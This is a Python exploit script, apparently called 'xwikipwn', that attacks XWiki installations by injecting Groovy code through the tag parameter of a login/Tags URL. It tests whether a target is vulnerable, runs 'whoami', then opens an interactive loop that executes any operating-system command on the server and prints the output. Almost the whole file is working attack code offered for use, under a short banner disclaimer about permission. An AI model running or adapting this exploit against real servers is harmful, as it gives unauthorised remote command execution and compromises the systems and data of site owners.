import requests
requests.packages.urllib3.disable_warnings() 
import urllib.parse
import sys
import re
from colored import Fore as fore
from colored import Back as back
from colored import Style as style
CLEANR = re.compile('<.*?>') 

PRE = '{{async async="false" cached="false" context="doc.reference"}}{{groovy}}'
POST = '{{/groovy}}{{/async}}'

BEFORE = 'XXXBEFOREXXX'
AFTER = 'XXXAFTERXXX'

xwiki = "/xwiki/bin/login/Main/Tags?xpage=view&do=viewTag&tag="

def cleanhtml(raw_html):
  raw_html = raw_html.replace('<br>', '\n').replace('<br/>', '\n')
  cleantext = re.sub(CLEANR, '', raw_html)
  return cleantext.strip()

def encode_command(command:str, before=BEFORE, after=AFTER) -> str:
  return urllib.parse.quote(f"{PRE}println('{before}');println('{command}'.execute().text);println('{after}');{POST}")

def encode(groovy, before=BEFORE, after=AFTER) -> str:
  return urllib.parse.quote(f"{PRE}{groovy}{POST}")

def make_url(host, encoded_command):
  return f"{host}{xwiki}{encoded_command}"

def replace_entities(raw):
  if raw is None: return None
  return raw.replace('&nbsp;', ' ').replace('&lt;', '<').replace('&gt', '>')

def find_output(txt:str, marker_before, marker_after):
  first_from = txt.find(marker_before)
  second_from = txt.find(marker_before, first_from+1)+len(marker_before)
  first_to = txt.find(marker_after, second_from+1)
  return cleanhtml(txt[second_from:first_to])

def execute_and_read(host, cmd="whoami"):
  try:
    command = encode_command(cmd)
    r = requests.get(make_url(host, command), verify=False)
    if r.status_code == 200 or r.status_code == 401:
      txt = r.text
      return find_output(txt, BEFORE, AFTER)
  except: 
    error(f"{fore.RED}That went wrong, please check your connection{style.RESET}")
  return None

def test(host) -> bool:
  try:
    url = make_url(host, encode('println(666*666);'))
    r = requests.get(url, verify=False)
    if r.status_code == 200 or r.status_code == 401:
      txt = r.text
      return f"{666*666}" in txt
  except:
    error(f"{fore.RED}Unable to test host, maybe no route to it?{style.RESET}")
    sys.exit(1)
  return False

def banner():
  print("")
  print("██╗  ██╗██╗    ██╗██╗██╗  ██╗██╗██████╗ ██╗    ██╗███╗   ██╗")
  print("╚██╗██╔╝██║    ██║██║██║ ██╔╝██║██╔══██╗██║    ██║████╗  ██║")
  print(" ╚███╔╝ ██║ █╗ ██║██║█████╔╝ ██║██████╔╝██║ █╗ ██║██╔██╗ ██║")
  print(" ██╔██╗ ██║███╗██║██║██╔═██╗ ██║██╔═══╝ ██║███╗██║██║╚██╗██║")
  print("██╔╝ ██╗╚███╔███╔╝██║██║  ██╗██║██║     ╚███╔███╔╝██║ ╚████║")
  print("╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝╚═╝  ╚═╝╚═╝╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝")
  print("")
  print("This will get you a (very basic) shell on a vulnerable XWiki")
  print(f"installation. {style.BOLD}{fore.RED}DO NOT USE THIS ON HOSTS YOU DO NOT OWN AND/OR")
  print(f"HAVE THE PERMISSION TO DO SO!{style.RESET}")
  print("")
  print(f"{style.BOLD}Anything you do with this code is YOUR responsibility, the  ")
  print(f"author cannot be held responsible!{style.RESET}")
  print("\n\n")
  
def info(msg:str):
  print(f"[{style.BOLD}{fore.LIGHT_BLUE}*{style.RESET}] {msg}")

def success(msg:str):
  print(f"[{style.BOLD}{fore.GREEN}+{style.RESET}] {msg}")

def error(msg:str):
  print(f"[{style.BOLD}{fore.RED}x{style.RESET}] {msg}")

def warn(msg:str):
  print(f"[{style.BOLD}{fore.YELLOW}!{style.RESET}] {msg}")


banner()

info(f"Please enter the host to target {style.DIM}(http[s]://...){style.RESET}\n")
host = input("xwikipwn > ")
print("")
info(f"Testing whether {fore.LIGHT_BLUE}{host}{style.RESET} is exploitable...")

vulnerable = test(host)
if vulnerable:
  success(f"{host} is vulnerable, one sec...")
else:
  error(f"Sorry, it seems {host} is patched")
  sys.exit(0)

user = execute_and_read(host, 'whoami')

if user is None:
  error(f"Sorry, unable to execute {fore.LIGHT_BLUE}whoami{style.RESET}, bailing")
  sys.exit(0)

# Fancyness is not optional, right?
success(f"You are now {style.BOLD}{style.BLINK}{fore.LIGHT_BLUE}{user}{style.RESET} on {style.BOLD}{fore.LIGHT_BLUE}{host}{style.RESET}, have fun :)\n")

while(True):
  cmd = input(f"{style.DIM}{user}{style.RESET} > ")
  if cmd.strip() == "exit":
    break
  try:
    result = replace_entities(execute_and_read(host, cmd))
    if result is None:
      error(f"{fore.RED}Whoops, that failed horribly{style.RESET}")
    else:
      print(result)
  except:
    warn(f"Command failed: {fore.RED}{cmd}{style.RESET}")

info("Hope you had fun :)")
